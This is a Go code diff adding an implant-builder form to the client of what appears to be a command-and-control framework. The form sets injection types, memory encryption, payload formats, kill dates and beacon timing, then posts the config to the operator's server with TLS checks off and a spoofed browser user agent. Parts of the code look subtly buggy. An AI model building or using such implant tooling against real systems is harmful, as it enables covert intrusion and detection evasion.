@@ -2,57 +2,95 @@ package mainmenu
 
 import (
 	"Client/Common"
+	"crypto/tls"
+	"encoding/json"
 	"errors"
 	"fyne.io/fyne/v2"
 	"fyne.io/fyne/v2/container"
 	"fyne.io/fyne/v2/dialog"
 	"fyne.io/fyne/v2/widget"
+	"log"
+	"net/http"
 	"strconv"
 	"strings"
 	"time"
 )
 
 func CreateImplantFunc(ImplantName, WorkingHours *Common.CustomEntry, KillDate time.Time, CustomHeaders string,
-	Sleep, Jitter int, Arch string, Listener *widget.CheckGroup, MemoryEncryptionType, InjectionType string, clientobj *Common.Client) {
-	/*
-		var (
-			ImplantData Common.ImplantTableData
-			err         error
-		)
-		//close the form window at end of the function.
-		defer NewWindow.Close()
+	Sleep, Jitter int, Arch string, Listener *widget.CheckGroup, MemoryEncryptionType, InjectionType, Format, HostRotation string, clientobj *Common.Client, NewWindow fyne.Window) {
+	var (
+		ImplantData Common.ImplantConfig
+		err         error
+		Jdata       []byte
+		transport   http.Transport
+		client      http.Client
+	)
+	//close the form window at end of the function.
+	defer NewWindow.Close()
 
-		ImplantData.ImplantName = ImplantName.Text
-		ImplantData.WorkingHours = WorkingHours.Text
-		ImplantData.KillDate = KillDate
-		ImplantData.CustomHeaders = CustomHeaders
-		ImplantData.Sleep, err = strconv.Atoi(Sleep)
-		if err != nil {
-			dialog.ShowInformation("Error", "likely the incorrect input information was given"+err.Error(), NewWindow)
-			return
-		}
-		ImplantData.Jitter, err = strconv.Atoi(Jitter)
-		if err != nil {
-			dialog.ShowInformation("Error", "likely the incorrect input information was given"+err.Error(), NewWindow)
-			return
-		}
-		ImplantData.Listener = Listener
-		ImplantData.MemoryEncryptionType = MemoryEncryptionType
-		ImplantData.InjectionType = InjectionType
+	ImplantData.ListenerConfig.Method = "POST"
+	ImplantData.ListenerConfig.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+	ImplantData.ListenerConfig.Headers = "Content-Type: */*"
 
-		//append implant to our implant table.
-		Common.ImplantData = append(Common.ImplantData, ImplantData)
-		Common.ImplantTable.Refresh()
-		//exit. implant added!
+	for _, val := range Listener.Selected {
+		for _, val2 := range Common.ListenerTableEntries {
+			ImplantData.ListenerConfig.Hosts = append(ImplantData.ListenerConfig.Hosts, val2.HOST+":"+strconv.Itoa(val2.PortBind))
+			if val == val2.ListenerName {
+				if val2.Protocol == "HTTPS" {
+					ImplantData.ListenerConfig.ListenerType = 1
+					ImplantData.ListenerConfig.Secure = true
+				} else {
+					ImplantData.ListenerConfig.ListenerType = 0
+					ImplantData.ListenerConfig.Secure = false
+				}
+			}
+		}
+	}
+
+	ImplantData.ListenerConfig.Name = ImplantName.Text
+	ImplantData.WorkingHours = WorkingHours.Text
+	ImplantData.KillDate = KillDate.Unix()
+	ImplantData.ListenerConfig.Headers = CustomHeaders
+	ImplantData.Sleep = Sleep
+	ImplantData.Jitter = Jitter
+	ImplantData.ListenerConfig.HostHeader = Listener.Selected[0]
+	if Arch == "x64" {
+		ImplantData.Arch = 1
+	} else {
+		ImplantData.Arch = 2
+	}
+	ImplantData.InjectionType = InjectionType
+	ImplantData.MemoryEncryptionType = MemoryEncryptionType
+	ImplantData.Format = Format
+	ImplantData.HostRotation = HostRotation
+
+	//setup the http tls configuration
+	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	client.Transport = &transport
+	//setup our endpoint
+	endpoint := "https://" + clientobj.Server + "/CreateImplant"
+
+	//parse our user bool input to bind it to our NewUser struct.
+	//marshal the data for http request.
+	Jdata, err = json.Marshal(ImplantData)
+	if err != nil {
+		log.Println("[error] attempting to marshal implant data", err)
 		return
-	*/
+	}
+	log.Println("[info] sending implant data to server: ", string(Jdata))
+	_, err = Common.PerformHTTPReq(clientobj, endpoint, Jdata)
+	if err != nil {
+		log.Println("[error] attempting to create new implant", err)
+	}
+
 	return
 }
 
-func ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch *Common.CustomEntry,
-	ListenerList *widget.CheckGroup, InjectionType, MemoryEncryptionType *widget.Select, clientobj *Common.Client, NewWindow fyne.Window) {
+func ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter *Common.CustomEntry,
+	ListenerList *widget.CheckGroup, InjectionType, MemoryEncryptionType, Format, HostRotation, Arch *widget.Select, clientobj *Common.Client, NewWindow fyne.Window) {
 	if ImplantName.Text == "" || WorkingHours.Text == "" || KillDate.Text == "" || Sleep.Text == "" ||
-		Jitter.Text == "" || Arch.Text == "" || InjectionType.Selected == "" || MemoryEncryptionType.Selected == "" {
+		Jitter.Text == "" || InjectionType.Selected == "" || MemoryEncryptionType.Selected == "" ||
+		Format.Selected == "" {
 		dialog.ShowInformation("Error", "Please fill out all fields", NewWindow)
 		return
 	} else {
@@ -67,10 +105,7 @@ func ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDa
 			return
 		}
 
-		if Arch.Text != "x64" && Arch.Text != "x86" {
-			dialog.ShowInformation("Error", "Architecture must be x64 or x86", NewWindow)
-			return
-		} else if SleepVal, err := strconv.Atoi(Sleep.Text); SleepVal < 0 || err != nil {
+		if SleepVal, err := strconv.Atoi(Sleep.Text); SleepVal < 0 || err != nil {
 			if err != nil {
 				dialog.ShowInformation("Error", "likely the incorrect input information was given"+err.Error(), NewWindow)
 				return
@@ -84,7 +119,7 @@ func ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDa
 			}
 			dialog.ShowInformation("Error", "Jitter must be greater than 0", NewWindow)
 			return
-		} else if _, err := time.Parse("2006-01-02 15:04:05", KillDate.Text); err != nil {
+		} else if KillDateVal, err := time.Parse("2006-01-02 15:04:05 ", KillDate.Text); err != nil {
 			dialog.ShowInformation("Error", "Invalid kill date format", NewWindow)
 			return
 		} else if vals := strings.Split(WorkingHours.Text, "-"); len(vals) != 2 {
@@ -97,17 +132,12 @@ func ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDa
 			dialog.ShowInformation("Error", "Invalid working hours format", NewWindow)
 			return
 		} else {
-			KillDateVal, err := time.Parse("2022-01-01 12:01:02", KillDate.Text)
-			if err != nil {
-				dialog.ShowInformation("Error", "Invalid kill date format", NewWindow)
-				return
-			}
 			/*
 				ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter *widget.Entry
 					ListenerList                                                            *widget.Select
 			*/
-			CreateImplantFunc(ImplantName, WorkingHours, KillDateVal, CustomHeaders.Text, SleepVal, JitterVal, Arch.Text,
-				ListenerList, MemoryEncryptionType.Selected, InjectionType.Selected, clientobj)
+			CreateImplantFunc(ImplantName, WorkingHours, KillDateVal, CustomHeaders.Text, SleepVal, JitterVal, Arch.Selected,
+				ListenerList, MemoryEncryptionType.Selected, InjectionType.Selected, Format.Selected, HostRotation.Selected, clientobj, NewWindow)
 		}
 	}
 }
@@ -116,48 +146,44 @@ func ImplantBuilderForm(clientobj *Common.Client, OldWindow fyne.App) error {
 
 	NewWindow := OldWindow.NewWindow("Implant Builder Form")
 
+	//TODO make the architecture a select option
 	var (
-		ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, HostRotation *Common.CustomEntry
-		InjectionType, MemoryEncryptionType                                                   *widget.Select
-		ListenerList                                                                          *widget.CheckGroup
+		ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter *Common.CustomEntry
+		InjectionType, MemoryEncryptionType, Format, HostRotation, Arch   *widget.Select
+		ListenerList                                                      *widget.CheckGroup
 	)
 
 	ImplantName = Common.NewCustomCredentialEntry(func() {
-		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
+		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, ListenerList, InjectionType, MemoryEncryptionType, Format, HostRotation, Arch, clientobj, NewWindow)
 	})
 	ImplantName.PlaceHolder = "Implant1"
 	WorkingHours = Common.NewCustomCredentialEntry(func() {
-		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
+		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, ListenerList, InjectionType, MemoryEncryptionType, Format, HostRotation, Arch, clientobj, NewWindow)
 	})
 	WorkingHours.PlaceHolder = "8:00-17:00"
 	CustomHeaders = Common.NewCustomCredentialEntry(func() {
-		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
+		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, ListenerList, InjectionType, MemoryEncryptionType, Format, HostRotation, Arch, clientobj, NewWindow)
 	})
-	CustomHeaders.PlaceHolder = "X-Forwarded-For: https://google.com"
+	CustomHeaders.PlaceHolder = "X-Forwarded-For: https://google.com, Referrer: https://bing.com"
 	KillDate = Common.NewCustomCredentialEntry(func() {
-		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
+		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, ListenerList, InjectionType, MemoryEncryptionType, Format, HostRotation, Arch, clientobj, NewWindow)
 	})
 	KillDate.PlaceHolder = "2022-01-01 12:00:00"
 	Sleep = Common.NewCustomCredentialEntry(func() {
-		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
+		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, ListenerList, InjectionType, MemoryEncryptionType, Format, HostRotation, Arch, clientobj, NewWindow)
 	})
 	Sleep.PlaceHolder = "1000"
 	Jitter = Common.NewCustomCredentialEntry(func() {
-		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
+		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, ListenerList, InjectionType, MemoryEncryptionType, Format, HostRotation, Arch, clientobj, NewWindow)
 	})
 	Jitter.PlaceHolder = "100"
-	Arch = Common.NewCustomCredentialEntry(func() {
-		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
-	})
-	Arch.PlaceHolder = "x64"
-	HostRotation = Common.NewCustomCredentialEntry(func() {
-		ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch, ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
-	})
-	HostRotation.PlaceHolder = "random || round-robin"
 
 	ListenerList = widget.NewCheckGroup([]string{}, nil)
-	InjectionType = widget.NewSelect([]string{}, nil)
-	MemoryEncryptionType = widget.NewSelect([]string{}, nil)
+	InjectionType = widget.NewSelect([]string{"Shellcode", "Reflective DLL", "Shellcode + Reflective DLL"}, nil)
+	MemoryEncryptionType = widget.NewSelect([]string{"None", "AES", "RC4", "ChaCha20"}, nil)
+	Format = widget.NewSelect([]string{"PE", "DLL", "Shellcode"}, nil)
+	HostRotation = widget.NewSelect([]string{"Random", "Round-Robin"}, nil)
+	Arch = widget.NewSelect([]string{"x64", "x86"}, nil)
 
 	for i, list := range Common.ListenerTableEntries {
 		if i == 0 && list.ListenerName == "" {
@@ -166,8 +192,6 @@ func ImplantBuilderForm(clientobj *Common.Client, OldWindow fyne.App) error {
 		}
 		ListenerList.Options = append(ListenerList.Options, list.ListenerName)
 	}
-	InjectionType.SetOptions([]string{"Shellcode", "Reflective DLL", "Shellcode + Reflective DLL"})
-	MemoryEncryptionType.SetOptions([]string{"None", "AES", "RC4", "ChaCha20"})
 
 	//create a new form.
 	form := &widget.Form{
@@ -176,11 +200,6 @@ func ImplantBuilderForm(clientobj *Common.Client, OldWindow fyne.App) error {
 				Text:     "Implant Name: ",
 				Widget:   ImplantName,
 				HintText: "SecureOne",
-			},
-			{
-				Text:     "Architecture: ",
-				Widget:   Arch,
-				HintText: "x64 || x86",
 			},
 			{
 				Text:     "Working Hours: ",
@@ -195,7 +214,7 @@ func ImplantBuilderForm(clientobj *Common.Client, OldWindow fyne.App) error {
 			{
 				Text:     "Custom HTTP Headers (optional): ",
 				Widget:   CustomHeaders,
-				HintText: "X-Forwarded-For: https://google.com",
+				HintText: "Comma separated list of headers",
 			},
 			{
 				Text:     "Sleep in Seconds: ",
@@ -208,12 +227,11 @@ func ImplantBuilderForm(clientobj *Common.Client, OldWindow fyne.App) error {
 				HintText: "100",
 			},
 			{
-				Text:     "Host Rotation",
-				Widget:   HostRotation,
-				HintText: "round-robin",
+				Text:   "Host Rotation",
+				Widget: HostRotation,
 			},
 			{
-				Text:   "Listener: ",
+				Text:   "Listeners: ",
 				Widget: ListenerList,
 			},
 			//TODO add more options that are accurate.
@@ -226,11 +244,19 @@ func ImplantBuilderForm(clientobj *Common.Client, OldWindow fyne.App) error {
 				Text:   "Memory Encryption Type: ",
 				Widget: MemoryEncryptionType,
 			},
+			{
+				Text:   "Format: ",
+				Widget: Format,
+			},
+			{
+				Text:   "Architecture: ",
+				Widget: Arch,
+			},
 		},
 		OnSubmit: func() {
-			ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter, Arch,
-				ListenerList, InjectionType, MemoryEncryptionType, clientobj, NewWindow)
-		}, // OnSubmit()
+			ImplantBuilderOnSubmitFunc(ImplantName, WorkingHours, CustomHeaders, KillDate, Sleep, Jitter,
+				ListenerList, InjectionType, MemoryEncryptionType, Format, HostRotation, Arch, clientobj, NewWindow)
+		},
 		OnCancel:   NewWindow.Close,
 		SubmitText: "Create Implant",
 		CancelText: "Exit",
